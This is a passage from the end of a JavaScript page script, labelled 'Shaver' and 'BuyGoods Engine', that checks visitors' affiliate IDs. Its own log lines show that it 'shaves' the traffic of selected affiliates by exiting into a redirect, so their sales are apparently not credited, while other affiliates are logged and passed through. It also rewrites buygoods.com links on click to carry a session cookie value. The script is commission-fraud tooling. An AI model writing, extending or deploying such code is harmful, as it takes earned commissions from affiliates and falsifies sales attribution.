            console.log('%c[Shaver] ═══ BuyGoods Engine — Shave in progress ═══', 'color:#e74c3c;font-weight:bold;font-size:12px');
            window.__shavingLoaded = true;
            return; // Exit IIFE — redirect will handle the rest
        } else {
            console.log('%c[Shaver] ✘ No match for aff_id:', 'color:#95a5a6;font-weight:bold', affId, subId ? '| subid: ' + subId : '');
            console.log('[Shaver] This affiliate is NOT being shaved — passing through');
            logTraffic(affId, subId, false, null, utmSource);
        }
    } else {
        console.log('[Shaver] No affiliate param detected — organic/direct visit');
        logTraffic('', '', false, null, utmSource);
    }

    console.log('%c[Shaver] ═══ BuyGoods Engine Complete ═══', 'color:#3498db;font-weight:bold;font-size:12px');

    window.__shavingLoaded = true;

    // ============================================================
    // INJECT TRACKING (normal flow — no shaver match)
    // ============================================================
    if (document.readyState === 'loading') { document.addEventListener('DOMContentLoaded', injectBGTracking); }
    else { injectBGTracking(); }

    // ============================================================
    // SESSID2 CLICK SAFETY NET
    // ============================================================
    document.addEventListener('click', function(e) {
        var target = e.target;
        while (target && target !== document.body) {
            if (target.href && target.href.indexOf('buygoods.com') !== -1) {
                var sessid2 = ReadCookie('sessid2');
                if (sessid2) {
                    try {
                        var url = new URL(target.href);
                        if (!url.searchParams.get('sessid2')) {
                            url.searchParams.set('sessid2', sessid2);
                            target.href = url.toString();
                            console.log('[Shaver] sessid2 appended on click');
                        }
                    } catch (e) {}
                }
                break;
            }
            target = target.parentElement;
        }
    }, true);

})();
